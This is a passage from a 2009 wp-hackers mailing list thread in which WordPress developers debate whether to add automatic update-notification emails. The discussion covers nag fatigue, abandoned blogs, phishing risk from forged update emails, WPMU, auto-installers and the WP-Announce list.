emailing routines.

> I also believe that the points made by others already in this  
> thread, such as the aspect of creating reliance on such an email,  
> are pretty valid and I could see it creating more support load in  
> the forums than it solves.

Not unless you believe there are a large number of "average" users who  
regularly log on to their site *just* to check if updates are  
available, but would stop if they thought the emails were coming  
anyway.  Not likely.

Those for whom this email would be useful are the ones who don't log  
on regularly.  So at *worst*, some of them get the emails (which is  
good), and some don't (which is no worse than right now).

Stephen

From ozh at planetozh.com  Mon Oct 19 18:30:27 2009
From: ozh at planetozh.com (Ozh)
Date: Mon, 19 Oct 2009 20:30:27 +0200
Subject: [wp-hackers] wordpress security
In-Reply-To: <Aq1KYaBI3J3KFwZ9@dsl-217-155-35-239.zen.co.uk>
References: <16402dc2.1ca4e74.2324c893.2e40@BrewerRadio.com>
	<op.u1wkarrbr6yny2@toscho.de>
	<161617690910161029y1de31834j2af910b3b5991284@mail.gmail.com>
	<862d087f0910161037l21575947t4ce51340033e9a97@mail.gmail.com>
	<4AD8BC80.6000406@gaarai.com>
	<161617690910161218qc0ce84ale69067b492bf6caa@mail.gmail.com>
	<862d087f0910161236w31e65c12rf512d4722cf0234@mail.gmail.com>
	<346205A2-D8B1-406B-8300-046C070EC66B@striderweb.com>
	<f38206c90910190752p6257046bk217941cabb21feed@mail.gmail.com>
	<Aq1KYaBI3J3KFwZ9@dsl-217-155-35-239.zen.co.uk>
Message-ID: <ae81acd10910191130u5ed36dcdn68d7ed919ed76325@mail.gmail.com>

Another thing to consider might be legitimacy of such an email. I can
predict naive users being tricked into downloading a fake archive from
w0rdpresss.org because they received a forged email seemingly from
wordpress at their-domain

Ozh
-- 
http://planetOzh.com ~ Blog and WordPress Stuff
http://FrenchFragFactory.net ~ Daily Quake News

From jer at simianuprising.com  Mon Oct 19 18:44:32 2009
From: jer at simianuprising.com (Jeremy Clarke)
Date: Mon, 19 Oct 2009 14:44:32 -0400
Subject: [wp-hackers] wordpress security
In-Reply-To: <ae81acd10910191130u5ed36dcdn68d7ed919ed76325@mail.gmail.com>
References: <16402dc2.1ca4e74.2324c893.2e40@BrewerRadio.com>
	<161617690910161029y1de31834j2af910b3b5991284@mail.gmail.com>
	<862d087f0910161037l21575947t4ce51340033e9a97@mail.gmail.com>
	<4AD8BC80.6000406@gaarai.com>
	<161617690910161218qc0ce84ale69067b492bf6caa@mail.gmail.com>
	<862d087f0910161236w31e65c12rf512d4722cf0234@mail.gmail.com>
	<346205A2-D8B1-406B-8300-046C070EC66B@striderweb.com>
	<f38206c90910190752p6257046bk217941cabb21feed@mail.gmail.com>
	<Aq1KYaBI3J3KFwZ9@dsl-217-155-35-239.zen.co.uk>
	<ae81acd10910191130u5ed36dcdn68d7ed919ed76325@mail.gmail.com>
Message-ID: <e1202cb10910191144k51cb40bbidf0edc3209709530@mail.gmail.com>

On Mon, Oct 19, 2009 at 9:46 AM, Otto <otto at ottodestruct.com> wrote:
> On Fri, Oct 16, 2009 at 2:36 PM, Nathan Rice <ncrice at gmail.com> wrote:
>> Do you really think that adding an email notification option will be
>> completely useless to the millions of WordPress users out there?
>
> Yes. I do. I think it is absolutely and utterly useless, and will not
> help anybody anywhere.

I don't know why you are so emotionally set against this idea but that
sentence is *way* to confident. How could you possibly make a sane
prediction that it would help no one? It *could* be more annoying than
useful, but there would definitely be many people who would get the
email and add the upgrade to their to do lists.

> Good grief man, even when the notification was added to the admin
> screens, people clamored and yelled for some way to disable *that*. Do
> you really think that an admin email enabled by default will go over
> well? I've already seen too many posts out there complaining about how
> WP is too naggy. This is only going to make things worse, and increase
> (not decrease) many people's opinion that WordPress is insecure.

The admin screen notices are a good point of consideration, but I
think in this case people are likely to be more forgiving. The problem
with the admin nag is that if you've seen it, considered it, and
decided to wait there's no way to communicate that to the nag. It's
there, on every screen, no matter what. After you log in, as you are
writing, as you moderate comments. It starts to grate on the nerves.

The email on the other hand would only arrive once per upgrade
notification. It should also include a link to your settings page
where you can disable the notifications if you don't want similar
emails in the future.

If anything what you're saying points out how maybe there should be a
built in system for silencing (temporarily or permanently) the upgrade
nag in admin, something like "hide this for 1 week".

On Mon, Oct 19, 2009 at 2:30 PM, Ozh <ozh at planetozh.com> wrote:
> Another thing to consider might be legitimacy of such an email. I can
> predict naive users being tricked into downloading a fake archive from
> w0rdpresss.org because they received a forged email seemingly from
> wordpress at their-domain

That applies equally to any update related email, including those
(that should be) sent by the core maintainers, hosting providers etc.
Also: If the email links to your own site where it tells you to log in
and update then it would be pretty damn safe.



Jeremy Clarke | http://jeremyclarke.org
Code and Design | http://globalvoicesonline.org

From jason at realestatetomato.com  Mon Oct 19 19:25:46 2009
From: jason at realestatetomato.com (Jason Benesch)
Date: Mon, 19 Oct 2009 12:25:46 -0700
Subject: [wp-hackers] wordpress security
In-Reply-To: <e1202cb10910191144k51cb40bbidf0edc3209709530@mail.gmail.com>
References: <16402dc2.1ca4e74.2324c893.2e40@BrewerRadio.com>
	<862d087f0910161037l21575947t4ce51340033e9a97@mail.gmail.com>
	<4AD8BC80.6000406@gaarai.com>
	<161617690910161218qc0ce84ale69067b492bf6caa@mail.gmail.com>
	<862d087f0910161236w31e65c12rf512d4722cf0234@mail.gmail.com>
	<346205A2-D8B1-406B-8300-046C070EC66B@striderweb.com>
	<f38206c90910190752p6257046bk217941cabb21feed@mail.gmail.com>
	<Aq1KYaBI3J3KFwZ9@dsl-217-155-35-239.zen.co.uk>
	<ae81acd10910191130u5ed36dcdn68d7ed919ed76325@mail.gmail.com>
	<e1202cb10910191144k51cb40bbidf0edc3209709530@mail.gmail.com>
Message-ID: <579c69ac0910191225y1c3f0925k310de53847e43936@mail.gmail.com>

Just my 2 cents on a little different approach...

The objective is to eliminate all of the old WP installs.

There are a lot of devs who are going around and setting up individual blogs
for clients.
So now we have 1000s of individual WP blogs who are being managed by those
not savvy enough to set it up on their own, but savvy enough to hire someone
for the setup (thinking they can manage it on their own).
These are most likely the blogs where the worms seem to spread the quickest.

I know when I first started working with WP several years ago, I got up to
300 single WP installs and realized very quickly I was not going to be able
to scale a business setting up individual blogs.
Moving to WPMU was a life saver.  I can update my platform and every blog
(762) is updated quickly, painlessly and instantly.

My point being this:

It is rumored that the WPMU project and WP will be merged together in the
3.0 release.  Maybe if the community comes together to better educate devs
on how to run their own WPMU platform, we can start to eliminate the onesies
that are causing the problems...

While I understand that this isn't a replacement for security patches or
auto emails, the ability to cluster blogs on to one platform, will work
towards helping to eliminate the "set up once and never used again,
soon-to-be-splogs"




On Mon, Oct 19, 2009 at 11:44 AM, Jeremy Clarke <jer at simianuprising.com>wrote:

> On Mon, Oct 19, 2009 at 9:46 AM, Otto <otto at ottodestruct.com> wrote:
> > On Fri, Oct 16, 2009 at 2:36 PM, Nathan Rice <ncrice at gmail.com> wrote:
> >> Do you really think that adding an email notification option will be
> >> completely useless to the millions of WordPress users out there?
> >
> > Yes. I do. I think it is absolutely and utterly useless, and will not
> > help anybody anywhere.
>
> I don't know why you are so emotionally set against this idea but that
> sentence is *way* to confident. How could you possibly make a sane
> prediction that it would help no one? It *could* be more annoying than
> useful, but there would definitely be many people who would get the
> email and add the upgrade to their to do lists.
>
> > Good grief man, even when the notification was added to the admin
> > screens, people clamored and yelled for some way to disable *that*. Do
> > you really think that an admin email enabled by default will go over
> > well? I've already seen too many posts out there complaining about how
> > WP is too naggy. This is only going to make things worse, and increase
> > (not decrease) many people's opinion that WordPress is insecure.
>
> The admin screen notices are a good point of consideration, but I
> think in this case people are likely to be more forgiving. The problem
> with the admin nag is that if you've seen it, considered it, and
> decided to wait there's no way to communicate that to the nag. It's
> there, on every screen, no matter what. After you log in, as you are
> writing, as you moderate comments. It starts to grate on the nerves.
>
> The email on the other hand would only arrive once per upgrade
> notification. It should also include a link to your settings page
> where you can disable the notifications if you don't want similar
> emails in the future.
>
> If anything what you're saying points out how maybe there should be a
> built in system for silencing (temporarily or permanently) the upgrade
> nag in admin, something like "hide this for 1 week".
>
> On Mon, Oct 19, 2009 at 2:30 PM, Ozh <ozh at planetozh.com> wrote:
> > Another thing to consider might be legitimacy of such an email. I can
> > predict naive users being tricked into downloading a fake archive from
> > w0rdpresss.org because they received a forged email seemingly from
> > wordpress at their-domain
>
> That applies equally to any update related email, including those
> (that should be) sent by the core maintainers, hosting providers etc.
> Also: If the email links to your own site where it tells you to log in
> and update then it would be pretty damn safe.
>
>
>
> Jeremy Clarke | http://jeremyclarke.org
> Code and Design | http://globalvoicesonline.org
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Jason Benesch

Real Estate Tomato
Co-owner
www.realestatetomato.com
(619) 770-1950
jason at realestatetomato.com

ListingPress
Owner, Founder
www.listingpress.com
(619) 955-7465
jason at listingpress.com

From wp-hackers at striderweb.com  Mon Oct 19 19:34:11 2009
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Mon, 19 Oct 2009 14:34:11 -0500
Subject: [wp-hackers] wordpress security
In-Reply-To: <ae81acd10910191130u5ed36dcdn68d7ed919ed76325@mail.gmail.com>
References: <16402dc2.1ca4e74.2324c893.2e40@BrewerRadio.com>
	<op.u1wkarrbr6yny2@toscho.de>
	<161617690910161029y1de31834j2af910b3b5991284@mail.gmail.com>
	<862d087f0910161037l21575947t4ce51340033e9a97@mail.gmail.com>
	<4AD8BC80.6000406@gaarai.com>
	<161617690910161218qc0ce84ale69067b492bf6caa@mail.gmail.com>
	<862d087f0910161236w31e65c12rf512d4722cf0234@mail.gmail.com>
	<346205A2-D8B1-406B-8300-046C070EC66B@striderweb.com>
	<f38206c90910190752p6257046bk217941cabb21feed@mail.gmail.com>
	<Aq1KYaBI3J3KFwZ9@dsl-217-155-35-239.zen.co.uk>
	<ae81acd10910191130u5ed36dcdn68d7ed919ed76325@mail.gmail.com>
Message-ID: <98778A89-DFE7-47C1-92B3-3338B7A7A4AE@striderweb.com>


On Oct 19, 2009, at 1:30 PM, Ozh wrote:

> Another thing to consider might be legitimacy of such an email. I can
> predict naive users being tricked into downloading a fake archive from
> w0rdpresss.org because they received a forged email seemingly from
> wordpress at their-domain

Good point, although a cracker could do that right now.

If we do the email, it should only ever point back to the Admin  
section of the blog in question, not a download link.  (Similar to  
legitimate emails from your bank that say "log in to your account to  
see  this information.")


-- 
Stephen Rider
http://striderweb.com/





From otto at ottodestruct.com  Mon Oct 19 20:05:10 2009
From: otto at ottodestruct.com (Otto)
Date: Mon, 19 Oct 2009 15:05:10 -0500
Subject: [wp-hackers] wordpress security
In-Reply-To: <e1202cb10910191144k51cb40bbidf0edc3209709530@mail.gmail.com>
References: <16402dc2.1ca4e74.2324c893.2e40@BrewerRadio.com> 
	<862d087f0910161037l21575947t4ce51340033e9a97@mail.gmail.com> 
	<4AD8BC80.6000406@gaarai.com>
	<161617690910161218qc0ce84ale69067b492bf6caa@mail.gmail.com> 
	<862d087f0910161236w31e65c12rf512d4722cf0234@mail.gmail.com> 
	<346205A2-D8B1-406B-8300-046C070EC66B@striderweb.com>
	<f38206c90910190752p6257046bk217941cabb21feed@mail.gmail.com> 
	<Aq1KYaBI3J3KFwZ9@dsl-217-155-35-239.zen.co.uk>
	<ae81acd10910191130u5ed36dcdn68d7ed919ed76325@mail.gmail.com> 
	<e1202cb10910191144k51cb40bbidf0edc3209709530@mail.gmail.com>
Message-ID: <161617690910191305j473b0523sdb34032d1f0e3df5@mail.gmail.com>

On Mon, Oct 19, 2009 at 1:44 PM, Jeremy Clarke <jer at simianuprising.com> wrote:
>> Yes. I do. I think it is absolutely and utterly useless, and will not
>> help anybody anywhere.
>
> I don't know why you are so emotionally set against this idea but that
> sentence is *way* to confident.

Not sure where those letters showed emotion there, but yeah, I'm
pretty confident. :)

> How could you possibly make a sane
> prediction that it would help no one? It *could* be more annoying than
> useful, but there would definitely be many people who would get the
> email and add the upgrade to their to do lists.

I think you're making some fundamental assumptions here that could be
fruitfully addressed.

1. You assume I'm "sane". Not necessarily a good bet.

2. You're assuming that there exists some subset of people whom a) do
not do upgrades regularly now and b) would be motivated to do so by
receiving an email to that effect. I submit that this assumption is
seemingly based on nothing whatsoever, as I am unable to find any
support for this notion in any support forums, blog posting, comments
on blog postings, or indeed in any other part of reality as I can
currently perceive it. This subset of people appears, to me, to be
some idealized notion, a blog owner who is truly helpless and unable
to do something as simple as actually look at his own website from
time to time, despite somehow continuing to write posts on it and
possibly even interact with people through it. Not only that, but if
this mythical blogger was, say, hacked, then he'd be upset for being
so, despite having not looked at the back end of the site in the last
couple of months...

> The admin screen notices are a good point of consideration, but I
> think in this case people are likely to be more forgiving. The problem
> with the admin nag is that if you've seen it, considered it, and
> decided to wait there's no way to communicate that to the nag. It's
> there, on every screen, no matter what. After you log in, as you are
> writing, as you moderate comments. It starts to grate on the nerves.
>
> The email on the other hand would only arrive once per upgrade
> notification. It should also include a link to your settings page
> where you can disable the notifications if you don't want similar
> emails in the future.

And yet an email notification is much more direct and intrusive than a
small yellowing box which is easily ignored (or better yet, heeded). I
would find such an email notification much more annoying.

> If anything what you're saying points out how maybe there should be a
> built in system for silencing (temporarily or permanently) the upgrade
> nag in admin, something like "hide this for 1 week".

No, I must disagree with this as well. The yellow box is necessary to
get people to actually do something about it, like upgrade. When
people who got hacked recently complained, I was quite able to ask
them "why didn't you do anything about that yellow box which has been
there for 2 months" and thus the conversation, such as it was, was
resolved. An email that could be deleted or a box that could be turned
off would get an "I forgot" or "it went in my spam folder" response,
providing yet another out.

The current system strikes me as ideal. No changes are necessary for
it to continue to be ideal, IMO.

-Otto

From jer at simianuprising.com  Mon Oct 19 20:24:38 2009
From: jer at simianuprising.com (Jeremy Clarke)
Date: Mon, 19 Oct 2009 16:24:38 -0400
Subject: [wp-hackers] wordpress security
In-Reply-To: <161617690910191305j473b0523sdb34032d1f0e3df5@mail.gmail.com>
References: <16402dc2.1ca4e74.2324c893.2e40@BrewerRadio.com>
	<4AD8BC80.6000406@gaarai.com>
	<161617690910161218qc0ce84ale69067b492bf6caa@mail.gmail.com>
	<862d087f0910161236w31e65c12rf512d4722cf0234@mail.gmail.com>
	<346205A2-D8B1-406B-8300-046C070EC66B@striderweb.com>
	<f38206c90910190752p6257046bk217941cabb21feed@mail.gmail.com>
	<Aq1KYaBI3J3KFwZ9@dsl-217-155-35-239.zen.co.uk>
	<ae81acd10910191130u5ed36dcdn68d7ed919ed76325@mail.gmail.com>
	<e1202cb10910191144k51cb40bbidf0edc3209709530@mail.gmail.com>
	<161617690910191305j473b0523sdb34032d1f0e3df5@mail.gmail.com>
Message-ID: <e1202cb10910191324w64c9581ai3904abe45ab3dc0a@mail.gmail.com>

On Mon, Oct 19, 2009 at 4:05 PM, Otto <otto at ottodestruct.com> wrote:
> 2. You're assuming that there exists some subset of people whom a) do
> not do upgrades regularly now and b) would be motivated to do so by
> receiving an email to that effect. I submit that this assumption is
> seemingly based on nothing whatsoever, as I am unable to find any
> support for this notion in any support forums, blog posting, comments
> on blog postings, or indeed in any other part of reality as I can
> currently perceive it. This subset of people appears, to me, to be
> some idealized notion, a blog owner who is truly helpless and unable
> to do something as simple as actually look at his own website from
> time to time, despite somehow continuing to write posts on it and
> possibly even interact with people through it. Not only that, but if
> this mythical blogger was, say, hacked, then he'd be upset for being
> so, despite having not looked at the back end of the site in the last
> couple of months...

I'll point out that I, as well as a number of other people in this
thread, have specifically stated that we ourselves would profit from
this, so it's not an idealized notion, its a group of people who you
just claimed don't exist while in conversation with them.

It's also pretty unrealistic to expect all blog admins to visit the
sites they manage on a regular basis. Not only are they likely to set
up sites for friends (who may or may not use them regularly) but in my
experience there are a lot of times when you're managing sites that
are basically retired, but that you don't want to take down because
you don't like dead links on the internet. In both of these cases
(which I think account for a lot of the people on this list who said
it would be useful to them) the email feature would be both a handy
reminder on top of your other organizational tactics and potentially
the only thing that would ever remind you that the site exists and
needs attention (whether it turns out that attention is to be upgraded
or deleted due to being dead/never-used).


> No, I must disagree with this as well. The yellow box is necessary to
> get people to actually do something about it, like upgrade. When
> people who got hacked recently complained, I was quite able to ask
> them "why didn't you do anything about that yellow box which has been
> there for 2 months" and thus the conversation, such as it was, was
> resolved. An email that could be deleted or a box that could be turned
> off would get an "I forgot" or "it went in my spam folder" response,
> providing yet another out.

Okay so you

a) dealt with people on the forums who noticed their blogs were hacked

and

b) noticed that they were all people who had seen the message.

Concluding that all the people who's blogs were hacked had seen the
message from this is wrong. Many sites were and are silently hacked
without the admin ever knowing about it. I don't know the full details
but if the recent wave of attacks was really a 'worm' then these
abandoned blogs are a huge part of the problem. Making them noisier
could only help the situation.

-- 
Jeremy Clarke | http://jeremyclarke.org
Code and Design | http://globalvoicesonline.org

From scribu at gmail.com  Mon Oct 19 20:33:50 2009
From: scribu at gmail.com (scribu)
Date: Mon, 19 Oct 2009 23:33:50 +0300
Subject: [wp-hackers] wordpress security
In-Reply-To: <e1202cb10910191324w64c9581ai3904abe45ab3dc0a@mail.gmail.com>
References: <16402dc2.1ca4e74.2324c893.2e40@BrewerRadio.com>
	<161617690910161218qc0ce84ale69067b492bf6caa@mail.gmail.com>
	<862d087f0910161236w31e65c12rf512d4722cf0234@mail.gmail.com>
	<346205A2-D8B1-406B-8300-046C070EC66B@striderweb.com>
	<f38206c90910190752p6257046bk217941cabb21feed@mail.gmail.com>
	<Aq1KYaBI3J3KFwZ9@dsl-217-155-35-239.zen.co.uk>
	<ae81acd10910191130u5ed36dcdn68d7ed919ed76325@mail.gmail.com>
	<e1202cb10910191144k51cb40bbidf0edc3209709530@mail.gmail.com>
	<161617690910191305j473b0523sdb34032d1f0e3df5@mail.gmail.com>
	<e1202cb10910191324w64c9581ai3904abe45ab3dc0a@mail.gmail.com>
Message-ID: <349fe48b0910191333p16453f60iacf6f23103af6c14@mail.gmail.com>

On Mon, Oct 19, 2009 at 11:24 PM, Jeremy Clarke <jer at simianuprising.com>wrote:

> On Mon, Oct 19, 2009 at 4:05 PM, Otto <otto at ottodestruct.com> wrote:
> > 2. You're assuming that there exists some subset of people whom a) do
> > not do upgrades regularly now and b) would be motivated to do so by
> > receiving an email to that effect. I submit that this assumption is
> > seemingly based on nothing whatsoever, as I am unable to find any
> > support for this notion in any support forums, blog posting, comments
> > on blog postings, or indeed in any other part of reality as I can
> > currently perceive it. This subset of people appears, to me, to be
> > some idealized notion, a blog owner who is truly helpless and unable
> > to do something as simple as actually look at his own website from
> > time to time, despite somehow continuing to write posts on it and
> > possibly even interact with people through it. Not only that, but if
> > this mythical blogger was, say, hacked, then he'd be upset for being
> > so, despite having not looked at the back end of the site in the last
> > couple of months...
>
> I'll point out that I, as well as a number of other people in this
> thread, have specifically stated that we ourselves would profit from
> this, so it's not an idealized notion, its a group of people who you
> just claimed don't exist while in conversation with them.
>
> It's also pretty unrealistic to expect all blog admins to visit the
> sites they manage on a regular basis. Not only are they likely to set
> up sites for friends (who may or may not use them regularly) but in my
> experience there are a lot of times when you're managing sites that
> are basically retired, but that you don't want to take down because
> you don't like dead links on the internet. In both of these cases
> (which I think account for a lot of the people on this list who said
> it would be useful to them) the email feature would be both a handy
> reminder on top of your other organizational tactics and potentially
> the only thing that would ever remind you that the site exists and
> needs attention (whether it turns out that attention is to be upgraded
> or deleted due to being dead/never-used).
>

I thought we had established that blog admins are savvy enough to install
the mail notification plugin.


-- 
http://scribu.net

From gaarai at gaarai.com  Mon Oct 19 21:12:44 2009
From: gaarai at gaarai.com (Chris Jean)
Date: Mon, 19 Oct 2009 16:12:44 -0500
Subject: [wp-hackers] wordpress security
In-Reply-To: <349fe48b0910191333p16453f60iacf6f23103af6c14@mail.gmail.com>
References: <16402dc2.1ca4e74.2324c893.2e40@BrewerRadio.com>	<161617690910161218qc0ce84ale69067b492bf6caa@mail.gmail.com>	<862d087f0910161236w31e65c12rf512d4722cf0234@mail.gmail.com>	<346205A2-D8B1-406B-8300-046C070EC66B@striderweb.com>	<f38206c90910190752p6257046bk217941cabb21feed@mail.gmail.com>	<Aq1KYaBI3J3KFwZ9@dsl-217-155-35-239.zen.co.uk>	<ae81acd10910191130u5ed36dcdn68d7ed919ed76325@mail.gmail.com>	<e1202cb10910191144k51cb40bbidf0edc3209709530@mail.gmail.com>	<161617690910191305j473b0523sdb34032d1f0e3df5@mail.gmail.com>	<e1202cb10910191324w64c9581ai3904abe45ab3dc0a@mail.gmail.com>
	<349fe48b0910191333p16453f60iacf6f23103af6c14@mail.gmail.com>
Message-ID: <4ADCD64C.70209@gaarai.com>

The only thing that has been established is that this is a controversial
issue and that people on this list cannot agree on what type of person
represents the average WordPress user.

The set of WordPress blog admins does not equal the set of people who
are savvy enough to install notifications plugins. Claiming such is
ignorant.

I would wager that the set of people who don't know of the existence of
such a plugin nor are knowledgeable about the value of such a plugin far
exceeds the population of the set of people who regularly update their
WordPress install with the latest version.

Let's all keep in mind that not everyone who uses WordPress thinks like
you, me, or most of the people on this list. In addition, not everyone
who uses WordPress uses it like we do. I'm sure that just this list's
sampling of users will show a huge diversity in ways of using WordPress.

Summarily dismissing a concept that could, at least in theory, help
reduce the attack profile of WordPress sites as a whole due to either
our or an imagined group of complainers' perceived annoyance is absurd.

Why don't we ask people if they like the idea? I sent a question out on
Twitter the other day:

    Would you like it if your WordPress site sent you an email telling
    you when a new version was available with a simple link to upgrade?

Since I don't have a large follower count, I only got five responses
about the question. However, those five people all said that they would
like it:

    * @david_north: yes I would.
    * @mattdanner: yes
    * @brigwyn: ... you got my vote!
    * @bryceraley: why yes sir? always innovating, and always
      appreciated! /[odd response but still supportive]/
    * @dannygsmith: That could be very useful for casual users. Not
      everyone follows the forums, or pays attention.

I'd like to note that none of these people are hardcore developers, and
I don't believe any of them are on this list. In addition, it seems that
only one of them knew about the plugin as @brigwyn first said that there
is a plugin for that. I told him that there is a suggestion to add it to
WordPress itself, and he said that he supports the idea.

I know that a small group of five people doesn't really constitute a
raving demand, but it does show that more than just a couple of people
here like the idea.

I propose that we ask a wider group. I'm going to send Jeffro a request
to put out a poll to get a bigger set of feedback with a wider audience
than just this list.

Chris Jean
http://gaarai.com/
http://wp-roadmap.com/
http://dnsyogi.com/



scribu wrote:
> I thought we had established that blog admins are savvy enough to install
> the mail notification plugin.
>   

From mccormicky at gmail.com  Mon Oct 19 21:19:36 2009
From: mccormicky at gmail.com (mccormicky)
Date: Mon, 19 Oct 2009 17:19:36 -0400
Subject: [wp-hackers] wordpress security
In-Reply-To: <349fe48b0910191333p16453f60iacf6f23103af6c14@mail.gmail.com>
References: <16402dc2.1ca4e74.2324c893.2e40@BrewerRadio.com>
	<862d087f0910161236w31e65c12rf512d4722cf0234@mail.gmail.com>
	<346205A2-D8B1-406B-8300-046C070EC66B@striderweb.com>
	<f38206c90910190752p6257046bk217941cabb21feed@mail.gmail.com>
	<Aq1KYaBI3J3KFwZ9@dsl-217-155-35-239.zen.co.uk>
	<ae81acd10910191130u5ed36dcdn68d7ed919ed76325@mail.gmail.com>
	<e1202cb10910191144k51cb40bbidf0edc3209709530@mail.gmail.com>
	<161617690910191305j473b0523sdb34032d1f0e3df5@mail.gmail.com>
	<e1202cb10910191324w64c9581ai3904abe45ab3dc0a@mail.gmail.com>
	<349fe48b0910191333p16453f60iacf6f23103af6c14@mail.gmail.com>
Message-ID: <d7153760910191419l26646923pa44a92e06ac789e2@mail.gmail.com>

Exactly who do you need to coddle here?
There are users who may not be savvy enough to have a plugin that tells them
they need to upgrade but they have an install modern enough to have the
update nag.


There are have users savvy enough to not only have a plugin that emails them
they can also install wpmu
they don't need an email or a plugin to tell them they need to upgrade.

There are users able to update their installs via svn,
they don't need an email or a plugin to tell them they need to upgrade.

There are users still running old wps because they depend on old plugins
that have *probably been moved to core but are either unaware or ignorant of
the fact they could upgrade without losing the functionality of the plugin.
They can't see either the upgrade nag because this is not available in their
install versions
so it follows that an email would not get to them because they would not
have the install with this function.

Seems to me the people most needing help are the last group.
They need to be told and told often that they need to upgrade for security
and that keeping old versions for the sake of plugins or fear of change
is unwise.Too bad they would be left out of this entire argument by the fact
they would not have a wordpress that would have the upgrade nag or an
upgrade alert email.
So its up to the blogosphere to convince them. Although I really think
people this out of it cannot be helped.

I also think that not doing something because 25 people will complain about
it but 200,000 will be helped is not reasonable.


On Mon, Oct 19, 2009 at 4:33 PM, scribu <scribu at gmail.com> wrote:

> On Mon, Oct 19, 2009 at 11:24 PM, Jeremy Clarke <jer at simianuprising.com
> >wrote:
>
> > On Mon, Oct 19, 2009 at 4:05 PM, Otto <otto at ottodestruct.com> wrote:
> > > 2. You're assuming that there exists some subset of people whom a) do
> > > not do upgrades regularly now and b) would be motivated to do so by
> > > receiving an email to that effect. I submit that this assumption is
> > > seemingly based on nothing whatsoever, as I am unable to find any
> > > support for this notion in any support forums, blog posting, comments
> > > on blog postings, or indeed in any other part of reality as I can
> > > currently perceive it. This subset of people appears, to me, to be
> > > some idealized notion, a blog owner who is truly helpless and unable
> > > to do something as simple as actually look at his own website from
> > > time to time, despite somehow continuing to write posts on it and
> > > possibly even interact with people through it. Not only that, but if
> > > this mythical blogger was, say, hacked, then he'd be upset for being
> > > so, despite having not looked at the back end of the site in the last
> > > couple of months...
> >
> > I'll point out that I, as well as a number of other people in this
> > thread, have specifically stated that we ourselves would profit from
> > this, so it's not an idealized notion, its a group of people who you
> > just claimed don't exist while in conversation with them.
> >
> > It's also pretty unrealistic to expect all blog admins to visit the
> > sites they manage on a regular basis. Not only are they likely to set
> > up sites for friends (who may or may not use them regularly) but in my
> > experience there are a lot of times when you're managing sites that
> > are basically retired, but that you don't want to take down because
> > you don't like dead links on the internet. In both of these cases
> > (which I think account for a lot of the people on this list who said
> > it would be useful to them) the email feature would be both a handy
> > reminder on top of your other organizational tactics and potentially
> > the only thing that would ever remind you that the site exists and
> > needs attention (whether it turns out that attention is to be upgraded
> > or deleted due to being dead/never-used).
> >
>
> I thought we had established that blog admins are savvy enough to install
> the mail notification plugin.
>
>
> --
> http://scribu.net
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From lynne.pope at gmail.com  Mon Oct 19 22:34:49 2009
From: lynne.pope at gmail.com (Lynne Pope)
Date: Tue, 20 Oct 2009 11:34:49 +1300
Subject: [wp-hackers] wordpress security
In-Reply-To: <d7153760910191419l26646923pa44a92e06ac789e2@mail.gmail.com>
References: <16402dc2.1ca4e74.2324c893.2e40@BrewerRadio.com> 
	<346205A2-D8B1-406B-8300-046C070EC66B@striderweb.com>
	<f38206c90910190752p6257046bk217941cabb21feed@mail.gmail.com> 
	<Aq1KYaBI3J3KFwZ9@dsl-217-155-35-239.zen.co.uk>
	<ae81acd10910191130u5ed36dcdn68d7ed919ed76325@mail.gmail.com> 
	<e1202cb10910191144k51cb40bbidf0edc3209709530@mail.gmail.com> 
	<161617690910191305j473b0523sdb34032d1f0e3df5@mail.gmail.com> 
	<e1202cb10910191324w64c9581ai3904abe45ab3dc0a@mail.gmail.com> 
	<349fe48b0910191333p16453f60iacf6f23103af6c14@mail.gmail.com> 
	<d7153760910191419l26646923pa44a92e06ac789e2@mail.gmail.com>
Message-ID: <427667db0910191534g2643695dua759cb7c7a24ad36@mail.gmail.com>

2009/10/20 mccormicky <mccormicky at gmail.com>

>
> I also think that not doing something because 25 people will complain about
> it but 200,000 will be helped is not reasonable.
>

One of the problems faced by all FOSS projects is that developers are rarely
able to identify what constitutes an "average user". Another problem is the
assumption that if users don't like a feature, they will complain and we
will all know.

WordPress is downloaded millions of times. If even half of those downloads
result in a live site, then the discrepancy in numbers between installs and
people visiting the forums or mailing lists is huge. Many people who have
complaints over things they don't like don't bother saying anything, they
just change to another open source app. Kudos or complaints are not a good
way to judge if a feature is wanted/liked/not causing issues.

When considering the subsets of users, two important groups were overlooked:

1) Users who do an auto install via a server script such as Fantastico.
These people tend to rely on their auto-installer to help keep them
up-to-date. Some of these scripts send out an email notification, some
don't. Since the auto-installers usually have to be licensed by the hosting
provider these are not always up-to-date and I know of at least one host
that is still providing WordPress 2.5.1 as a one-click install.
Apps are often modified by the auto-installers. The user thinks they are
getting WordPress but what they are really getting is a modified
distribution of WordPress with no guarantee that update nags are even
present.

2) Hosts/ISP's.
Hosts can be a projects best friend or worst enemy. They don't get to see
update notices and an email notification from inside a WordPress install is
not going to help them. If they perceive WordPress to be insecure they
either ban it from their servers or warn their customers not to use it. Or
refuse to help if a site is hacked.
On the other hand, a host that keeps informed about new releases will
usually send out notices or announce the update on their forums. These may
be the only forums a user visits.

In my earlier email I suggested adding an opt-in link to the WordPress
announcements list. When I was thinking more about this I realised that
having any information on the readme or install screens doesn't help the
users in 1). Many of the auto-install scripts remove the install screens.

I have read everyone's arguments for an opt-in email in the core, but am
still firmly convinced that its not the way to go. Most people have enough
clues to check which version they are using (if they don't already know) so
a simple notification that a new release is available and whether that
release is a security release or not should suffice.

The WP-Announce list exists. Everyone can use it, including hosts, to get
email announcements (assuming the list will ever be used). So, what I
propose is this:
Get a commitment from the core team that they will issue announcements on
that list. And that they will state which upgrades are necessary for
security.
Change the sample data - instead of, "this is a post", provide some
meaningful information. With a link to subscribe to WP-Announce.
Make an entry announcing that WP-Announce is being used, so this will show
in the dashboard feeds. Bloggers will quickly pick up on this and news of it
will spread.

Lynne

From ezs at evilzenscientist.com  Mon Oct 19 23:33:44 2009
From: ezs at evilzenscientist.com (Evil ZEN Scientist)
Date: Mon, 19 Oct 2009 16:33:44 -0700
Subject: [wp-hackers] wordpress security
In-Reply-To: <427667db0910191534g2643695dua759cb7c7a24ad36@mail.gmail.com>
References: <16402dc2.1ca4e74.2324c893.2e40@BrewerRadio.com>
	<f38206c90910190752p6257046bk217941cabb21feed@mail.gmail.com>
